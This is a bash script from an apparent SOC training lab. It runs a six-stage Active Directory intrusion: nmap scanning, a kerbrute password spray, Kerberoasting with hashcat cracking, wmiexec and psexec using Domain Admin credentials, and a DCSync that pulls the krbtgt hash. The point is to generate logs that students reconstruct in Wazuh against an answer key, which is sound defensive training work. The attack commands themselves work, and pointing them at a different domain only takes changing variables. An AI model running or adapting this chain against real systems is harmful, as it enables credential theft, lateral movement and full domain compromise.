#!/usr/bin/env bash
# Lab 06 — Full intrusion chain: recon -> foothold -> credential access ->
# privilege use -> lateral movement -> domain dominance (DCSync).
# This is the CAPSTONE: it generates a coherent, timestamped incident for you to
# reconstruct in Wazuh (Phase 5 hunting) and write up (Phase 6 IR).
#
# ATT&CK chain: T1046 -> T1110.003 -> T1558.003 -> T1078.002 -> T1021.002 -> T1003.006
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${HERE}/../lib/common.sh"

GT="${HERE}/GROUND-TRUTH.txt"            # the "answer key" — don't peek until you've hunted
: "${PACING:=20}"                        # seconds between acts, so events are separable
: "${SPRAY_PASSWORD:=Summer2025!}"       # the weak password the spray "discovers" (svc_sql)
: "${FOOTHOLD_USER:=svc_sql}"            # low-priv account obtained from the spray
: "${DA_USER:=helpdesk}"                 # the over-privileged (Domain Admin) account

stamp() { date -u +%Y-%m-%dT%H:%M:%SZ; }
log_gt() { printf '%s | %s\n' "$(stamp)" "$*" >> "$GT"; }
act() { step "$*"; }
pause() { sleep "$PACING"; }

echo "== Lab 06: Full intrusion (CAPSTONE) =="
cat <<EOF
${C_D}This runs a multi-stage attack end to end. It's designed to be reconstructed:
afterwards, open HUNT-GUIDE.md and rebuild the timeline from Wazuh WITHOUT looking
at GROUND-TRUTH.txt, then write it up with INCIDENT-REPORT-TEMPLATE.md.${C_0}
EOF
confirm_lab

# The Domain-Admin step represents credentials obtained via the over-privileged
# 'helpdesk' account (see SCENARIO.md for the honesty note). Provide them:
warn "The escalation/lateral/DCSync acts use the over-privileged '${DA_USER}' creds."
: "${DA_PASS:=}"
if [[ -z "$DA_PASS" ]]; then read -r -s -p "Password for ${DA_USER} (from lab.env SOC_USER_PASSWORD): " DA_PASS; echo; fi

ensure_nmap; ensure_kerbrute; ensure_impacket; ensure_hashcat || true

: > "$GT"
{ echo "# easy-deploy-SOC full-intrusion ground truth (answer key)"
  echo "# Attacker source: analyst box. Times are UTC."
  echo "# DO NOT read this until you've reconstructed the incident yourself."
  echo; } >> "$GT"
log_gt "INTRUSION START (attacker = analyst box, target = ${DOMAIN})"

# ── ACT 1 — Reconnaissance (T1046, T1087) ──────────────────────────────────
act "ACT 1 — Reconnaissance (T1046)"
log_gt "ACT1 T1046 Recon: nmap of DC ${DC_IP} and client ${CLIENT_IP}"
nmap -Pn -sV -p 88,135,139,389,445,3389 "$DC_IP" "$CLIENT_IP" >/dev/null 2>&1 || true
smbclient -L "//${DC_IP}" -N >/dev/null 2>&1 || true
ok "Recon done (port/service scan + null SMB attempt)."
pause

# ── ACT 2 — Initial access via password spray (T1110.003) ───────────────────
act "ACT 2 — Password spray finds a foothold (T1110.003)"
UF="$(mktemp)"; LAB_USERS_LIST > "$UF"
log_gt "ACT2 T1110.003 Spray '${SPRAY_PASSWORD}' across all users -> expect a hit on ${FOOTHOLD_USER}"
kerbrute passwordspray -d "$DOMAIN" --dc "$DC_IP" "$UF" "$SPRAY_PASSWORD" 2>&1 | grep -i valid || true
rm -f "$UF"
ok "Foothold: ${FOOTHOLD_USER}:${SPRAY_PASSWORD}"
pause

# ── ACT 3 — Credential access: Kerberoast + crack (T1558.003) ───────────────
act "ACT 3 — Kerberoast a service account and crack it (T1558.003)"
HASHES="${HERE}/loot-kerberoast.hashes"
log_gt "ACT3 T1558.003 Kerberoast as ${FOOTHOLD_USER} -> expect 4769 RC4 for an SPN account"
impacket-GetUserSPNs "${DOMAIN}/${FOOTHOLD_USER}:${SPRAY_PASSWORD}" -dc-ip "$DC_IP" \
  -request -outputfile "$HASHES" >/dev/null 2>&1 || true
if have hashcat && [[ -s "$HASHES" ]]; then
  hashcat -m 13100 -a 0 "$HASHES" "${HERE}/../03-kerberoasting/wordlist.txt" \
    --potfile-disable -o "${HERE}/loot-cracked.txt" >/dev/null 2>&1 || true
  [[ -s "${HERE}/loot-cracked.txt" ]] && ok "Cracked service ticket(s)." || warn "No crack (bigger wordlist needed)."
fi
pause

# ── ACT 4 — Privileged access with the over-privileged account (T1078.002) ──
act "ACT 4 — Use the over-privileged Domain Admin account (T1078.002)"
log_gt "ACT4 T1078.002 Authenticate to DC ${DC_IP} as ${DA_USER} (Domain Admin) -> expect 4624 type3 + 4672"
impacket-wmiexec "${DOMAIN}/${DA_USER}:${DA_PASS}@${DC_IP}" 'whoami' >/dev/null 2>&1 \
  && ok "Confirmed admin access to the DC as ${DA_USER}." \
  || warn "DC exec failed (check ${DA_USER} password). Continuing."
pause

# ── ACT 5 — Lateral movement to the workstation (T1021.002) ─────────────────
act "ACT 5 — Lateral movement to the client (T1021.002)"
log_gt "ACT5 T1021.002 psexec to client ${CLIENT_IP} as ${DA_USER} -> expect 7045 + 4624 type3 + Sysmon proc-create"
impacket-psexec "${DOMAIN}/${DA_USER}:${DA_PASS}@${CLIENT_IP}" 'cmd /c whoami' >/dev/null 2>&1 \
  && ok "Code execution on ${CLIENT_IP} (${SOC_CLIENT_NAME:-client})." \
  || warn "psexec to client failed (SMB/creds). Continuing."
pause

# ── ACT 6 — Domain dominance via DCSync (T1003.006) ─────────────────────────
act "ACT 6 — DCSync: replicate secrets from the DC (T1003.006)"
log_gt "ACT6 T1003.006 DCSync as ${DA_USER} -> expect 4662 with DS-Replication-Get-Changes on the DC"
impacket-secretsdump "${DOMAIN}/${DA_USER}:${DA_PASS}@${DC_IP}" -just-dc-user krbtgt 2>/dev/null \
  | grep -i 'krbtgt' | head -n1 \
  && ok "Replicated krbtgt hash (game over — Golden Ticket capable)." \
  || warn "DCSync failed (needs replication rights). Continuing."
log_gt "INTRUSION END"

echo
ok "Capstone complete. A full attack chain is now in the logs."
cat <<EOF

${C_G}Your mission now (do NOT open GROUND-TRUTH.txt yet):${C_0}
  1. Reconstruct the incident in Wazuh using ${C_B}HUNT-GUIDE.md${C_0}.
  2. Build a timeline: what happened, when, which host, which account.
  3. Write it up with ${C_B}INCIDENT-REPORT-TEMPLATE.md${C_0}.
  4. Only then, check yourself against ${C_B}GROUND-TRUTH.txt${C_0}.
  5. Reset the lab from your Phase-0 Proxmox snapshots.
EOF
